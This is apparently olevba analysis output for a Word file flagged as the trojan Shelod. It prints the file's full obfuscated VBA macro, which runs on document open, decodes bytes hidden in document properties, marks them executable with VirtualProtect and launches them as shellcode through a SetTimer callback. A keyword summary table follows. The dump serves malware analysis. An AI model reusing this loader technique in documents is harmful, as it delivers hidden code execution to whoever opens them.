olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-1ea378819e21ccd0229d84101d9cd9ba67c4c5087cc5b173cf28cbb2c68e0372
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-1ea378819e21ccd0229d84101d9cd9ba67c4c5087cc5b173cf28cbb2c68e0372 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function DelegationsNympholepticSqueamishness Lib "user32" Alias "SetTimer" (ByVal ReheadWaltzed As LongPtr, ByVal MetissesJaconetEighteenfold As LongPtr, ByVal IrianHampererIsosaccharin As LongPtr, ByVal AponeurologyCapitoulSympathetical As LongPtr) As LongPtr
Private Declare PtrSafe Function AntipudicPreconspiracyKenotron Lib "user32" Alias "KillTimer" (ByVal AmbiguouslyInseverably As LongPtr, ByVal TaxitePostarterial As LongPtr) As LongPtr
Private Declare PtrSafe Function StirrersBookwardsWomanfolk Lib "kernel32" Alias "VirtualProtect" (ByVal SeismometricalOverprizerUnisolated As LongPtr, ByVal LaevogyreGestaltist As LongPtr, ByVal LepidosphesUndub As LongPtr, NavviesErrorsHypostomata As LongPtr) As LongPtr
#Else
Private Declare Function DelegationsNympholepticSqueamishness Lib "user32" Alias "SetTimer" ( ByVal AleutiteCoaxy As Long, ByVal KotokoSupermental As Long, ByVal PlagaeWittall As Long, ByVal AffinesDistinguishedlyManid As Any) As Long
Private Declare Function AntipudicPreconspiracyKenotron Lib "user32" Alias "KillTimer" ( ByVal BeshroudingHeteroagglutinin As Long, ByVal HematocytotripsisHomesProtonymphal As Long) As Long
Private Declare Function StirrersBookwardsWomanfolk Lib "kernel32" Alias "VirtualProtect"  (ByVal AnomalOrnamented As Long, ByVal CastraterEloignCalcareobituminous As Long, ByVal CastellansGalipotGalleins As Long, DialectologiesIdylizeTrophically As Long) As Long
#End If
Private Sub Document_Open()
Dim TeardownSylphyStowbordmen() As Byte
#If Win64 Then
TeardownSylphyStowbordmen = EnmistTellurite(ActiveDocument.BuiltInDocumentProperties(tKO6ri_("oJJWSIYI")).Value)
#Else
TeardownSylphyStowbordmen = EnmistTellurite(ActiveDocument.BuiltInDocumentProperties(tKO6ri_("cOpX5OoB")).Value)
#End If
#If VBA7 Then
Dim DesensitizesDargsman As LongPtr
Dim ExfoliatoryEntothorax As LongPtr
Dim shellCode As LongPtr
Dim NidologistPhanerocrystallineEvincibly As LongPtr
#Else
Dim DesensitizesDargsman As Long
Dim ExfoliatoryEntothorax As Long
Dim shellCode As Long
Dim NidologistPhanerocrystallineEvincibly As Long
#End If
ExfoliatoryEntothorax = UBound(TeardownSylphyStowbordmen) + 1
shellCode = VarPtr(TeardownSylphyStowbordmen(0))
StirrersBookwardsWomanfolk shellCode, ExfoliatoryEntothorax, 64, VarPtr(DesensitizesDargsman)
GetObject(tKO6ri_("wfGVpVfp7M")).Environment(tKO6ri_("LZTrCYJX"))(tKO6ri_("PwPnAKDzfgC5")) = ActiveDocument.FullName
GetObject(tKO6ri_("iV4UPGN0A")).Environment(tKO6ri_("So89uU"))(tKO6ri_("vkrV2H0")) = tKO6ri_("PwFcZ2nBP")
NidologistPhanerocrystallineEvincibly = DelegationsNympholepticSqueamishness(0, shellCode, 1, shellCode)
SoffrittoImpresa 1
AntipudicPreconspiracyKenotron 0, NidologistPhanerocrystallineEvincibly
GetObject(tKO6ri_("riAHriaQMe2o")).Environment(tKO6ri_("pkhQXbrW5z")).Remove (tKO6ri_("lPY0CZcPETf8"))
GetObject(tKO6ri_("QyhJD5PxoO")).Environment(tKO6ri_("LvpHo173ys5")).Remove (tKO6ri_("eVQpfe7DUz02"))
ReDim TeardownSylphyStowbordmen(1)
End Sub
Sub SoffrittoImpresa(Finish)
Dim MusculiUncurtainedHentenian As Long
Dim ClassifiedPhiallingBeachier As Long
ClassifiedPhiallingBeachier = Timer() + (Finish)
Do
MusculiUncurtainedHentenian = Timer()
DoEvents
Loop Until MusculiUncurtainedHentenian > ClassifiedPhiallingBeachier
End Sub
Function MouthbreederSuperastonish(BartonAnger, RealestateUnconformed)
MouthbreederSuperastonish = Mid(BartonAnger, RealestateUnconformed + 1, 1)
End Function
Function ImperishablyRadicels(VintageUnleadSparger) As Long
If Int(Rnd(23)) > 2 Then
ImperishablyRadicels = 9000
Else
ImperishablyRadicels = Len(VintageUnleadSparger)
End If
End Function
Function EnmistTellurite(SperonarosEgotize)
ReDim SpermathecalScrotocele(ImperishablyRadicels(SperonarosEgotize) - 1) As Byte
Dim TapulAneared As Long, IndistinctHaybote As Long
Dim PolygamistTidingless: PolygamistTidingless = tKO6ri_("wbUCHGng") & tKO6ri_("SwiGw0m1")
For TapulAneared = 0 To ImperishablyRadicels(SperonarosEgotize) - 1 Step 2
IndistinctHaybote = TapulAneared / 2
SpermathecalScrotocele(IndistinctHaybote) = CDec(PolygamistTidingless & MouthbreederSuperastonish(SperonarosEgotize, TapulAneared) & MouthbreederSuperastonish(SperonarosEgotize, TapulAneared + 1))
Next
EnmistTellurite = SpermathecalScrotocele
End Function
Public Function tKO6ri_(strInput)
tKO6ri_ = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

